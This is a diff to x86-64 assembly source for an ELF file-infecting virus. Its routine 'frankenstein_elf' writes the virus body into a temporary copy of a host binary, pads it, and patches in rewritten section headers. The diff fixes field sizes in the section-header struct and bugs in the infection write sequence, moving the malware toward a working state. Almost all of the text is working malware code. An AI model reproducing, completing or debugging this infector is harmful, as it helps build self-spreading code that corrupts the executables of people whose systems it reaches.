@@ -205,14 +205,14 @@ section	.bss
 	endstruc
 
 	struc elf_shdr
-    	.sh_name		resw 1		; uint32_t   
-    	.sh_type		resw 1		; uint32_t   
+    	.sh_name		resd 1		; uint32_t   
+    	.sh_type		resd 1		; uint32_t   
     	.sh_flags		resq 1		; uint64_t   
     	.sh_addr		resq 1		; Elf64_Addr 
      	.sh_offset		resq 1		; Elf64_Off  
      	.sh_size		resq 1		; uint64_t   
-     	.sh_link		resw 1		; uint32_t   
-     	.sh_info		resw 1		; uint32_t   
+     	.sh_link		resd 1		; uint32_t   
+     	.sh_info		resd 1		; uint32_t   
      	.sh_addralign	resq 1		; uint64_t   
      	.sh_entsize		resq 1		; uint64_t   
 	endstruc
@@ -952,6 +952,7 @@ frankenstein_elf:
 		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
+;		jmp .close_temp		
 
 	;.write_hosttextsegment:
 		;;mov rcx, [evaddr]
@@ -964,12 +965,14 @@ frankenstein_elf:
 	;	mov rax, SYS_WRITE
 	;	syscall
 	.write_virus_totemp:
+		mov rdi, r9
 		mov rdx, vlen
 		mov rsi, _start
 		mov r10d, [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
 
+;		jmp .close_temp		
 		mov rsi, rax
 	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
@@ -977,7 +980,8 @@ frankenstein_elf:
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
 	;before we write the original host data segment to the temp file
 	.write_padding_after_vx:
-		add esi, dword [data_offset_new_padding]
+		mov esi, dword [data_offset_new_padding]
+		;add esi, dword [PAGESIZE]
 		mov rax, SYS_FTRUNCATE
 		syscall
 ;		jmp .close_temp		
@@ -990,22 +994,25 @@ frankenstein_elf:
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
+;		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + filestat.st_size]
+		;sub edx, dword [data_offset_new_padding]
 		sub edx, dword [oshoff]
 		mov rsi, [SHDR_OFFSET_HOST]
-		mov r10d, [vxshoff]
+		mov r10d, dword [vxshoff]
 		mov rax, SYS_PWRITE64
 		syscall
+;		jmp .close_temp		
 
 		
 		;munmap file from work area
 		;mov qword rsi, [elf_filesize]
-	;	mov rdi, r13
-	;	mov rsi, [r14 + filestat.st_size]
-	;	mov rax, SYS_MUNMAP
-	;	syscall
+		mov rdi, r13
+		mov rsi, [r14 + filestat.st_size]
+		mov rax, SYS_MUNMAP
+		syscall
 
 	;close temp file
 	.close_temp:
